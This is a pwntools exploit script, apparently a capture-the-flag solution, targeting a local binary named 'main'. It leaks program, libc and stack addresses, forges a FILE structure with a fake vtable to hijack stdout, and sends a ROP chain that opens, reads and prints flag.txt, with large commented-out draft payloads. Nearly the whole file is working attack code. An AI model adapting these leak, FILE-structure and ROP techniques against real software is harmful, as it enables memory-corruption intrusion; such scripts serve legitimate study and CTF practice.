#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 12345 ./main
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./main_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 12345)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
# b *main+208
b *main+299
b *fwrite+211
# b *__GI__IO_file_underflow+292
# b *get_name+212
# c
# c
# c
c
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()
from decimal import Decimal
import struct
# pack float
# pd = lambda x: str(Decimal(struct.unpack("<d",struct.pack("<Q",int(x) ) )[0]))
# # unpack float
# ud = lambda x: int(struct.unpack("<Q",struct.pack('<d',float(x) ) )[0])

pd = lambda x: str(struct.unpack('<f', x)[0])

# def d2d(f): # double to decimal
#     return struct.unpack('<Q', struct.pack('<d', f))[0]

libc = exe.libc
io.sendafter(': ','a'*8)
io.recvuntil("a"*8)
exe.address = u64(io.recv(6).ljust(8,"\x00")) - 0x1402
print hex(exe.address)

io.sendafter(': ','a'*8*5)
io.recvuntil('a'*8*5)
libc.address = u64(io.recv(6).ljust(8,"\x00")) - 0x8d3b3
print hex(libc.address)

io.sendafter(': ','a'*8*10)
io.recvuntil('a'*8*10)
stack = u64(io.recv(6).ljust(8,"\x00")) + 0x198
print hex(stack)

io.sendlineafter(': ','A')

io.sendlineafter(': ','64')
print struct.unpack('f', b'aaaa')[0]

# print(pd(p64(0xff)[:4]))
p = ''
# p += p64(0x00000000fbad3c84)
# # p += p64(exe.address + 0xdafa60)*4
# p += p64(exe.bss()+0x100)*4
# # p += p64(exe.address + 0xdafa60+8)
# p += p64(exe.bss()+0x100+8)
# # p += p64(exe.address + 0xdafa60)*3
# p += p64(exe.bss()+0x100)*3
# p += p64(0)*4
# p += p64(libc.sym['_IO_2_1_stderr_'])
# p += p64(0x0000000000000000) # 3
# p += p64(0)*2

# # p += p64(exe.address + 0xdaf910)
# p += p64(exe.bss()+0x200)
# # p += p64(0xffffffffffffffff)
# p += p64(0)
# p += p64(0)
# # p += p64(exe.address + 0xdaf910+0x10)
# p += p64(exe.bss()+0x200)
# p += p64(0)*3
# # p += p64(0x00000000ffffffff)
# p += p64(0)
# p += p64(0)*2
# # p += p64(exe.address + 0x202108)
# p += p64(libc.symbols["_IO_file_jumps"]+56)

# _IO_2_1_STDOUT_= libc.sym['_IO_2_1_stdout_']
# p += p64(0xfbad2000) # 0xfbad208b
# # p += p64(libc.address+0x3eba83)*7
# # p += p64(libc.address+0x3eba83+0x100)
# p += p64(_IO_2_1_STDOUT_) # _IO_read_ptr (needs to be a valid pointer) 
# p += p64(0) * 5 # _IO_read_end - _IO_write_end
# p += p64(_IO_2_1_STDOUT_) # _IO_buf_base
# p += p64(_IO_2_1_STDOUT_ + 0x1000) # _IO_buf_end, size 0x1000 bytes
# p += p64(0)*6
# p += p64(0xffffffffffffffff)
# # p += p64(0)
# p += p64(0)
# p += p64(libc.address+0x3ed8d0+0x100)
# # p += p64(0xffffffffffffffff)
# p += p64(0)
# p += p64(0)
# p += p64(libc.address+0x3ebae0+0x100)
# p += p64(0)*6
# # p += p64(exe.address + 0x202108)
# p += p64(libc.symbols["_IO_file_jumps"]-3*8)
# # p += p64(stack)

# # 216
# p += p64(libc.sym['setcontext']+53)

# p = p.ljust(0x100,'\x00')
# p += p64(exe.address+0x202060)[:4]

# print hex(libc.sym['setcontext']+53)

# for i in range(65):
#     io.sendlineafter(': ',pd(p[i*4:i*4+4:]))

# io.sendlineafter("Report:\n",'a'*200)

##################
stdout_addr = libc.symbols['_IO_2_1_stdout_']
stdout = stdout_addr
stdout_lock = exe.address + 0x202060 + 0x80

fake_vtable = libc.symbols['_IO_wfile_jumps']-3*8
# our gadget
gadget = libc.address + 0x0000000000163830 # add rdi, 0x10 ; jmp rcx
gadget = libc.address + 0x000000000014238b # add rsp, 0x168 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.symbols['system']
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'flag.txt') # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= exe.address+0x202060 + 0x48-0x18
fake._wide_data = exe.address+0x202060+0xe8

fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

pay = bytes(fake)

print("LEN : {:04x}".format(len(pay)))
p = pay.ljust(64*4, b"\x00")
p += p64(exe.address+0x202060)[:4]

for i in range(65):
    io.sendlineafter(': ',pd(p[i*4:i*4+4:]))

pop_rdx_rsi = libc.address + 0x0000000000130539 # : pop rdx ; pop rsi ; ret
pop_rdi = libc.address + 0x000000000002164f
pay = b"A"*0x20
pay += p64(pop_rdx_rsi)
pay += p64(0)*2
pay += p64(libc.symbols['open'])

pay += p64(pop_rdi)
pay += p64(4)
pay += p64(pop_rdx_rsi)
pay += p64(0x100)
pay += p64(exe.address+0x202060)
pay += p64(libc.symbols['read'])

pay += p64(pop_rdi)
pay += p64(1)
pay += p64(pop_rdx_rsi)
pay += p64(0x100)
pay += p64(exe.address+0x202060)
pay += p64(libc.symbols['write'])

pay += b"B"*0x20
io.sendlineafter("Report:\n",pay)
io.interactive()

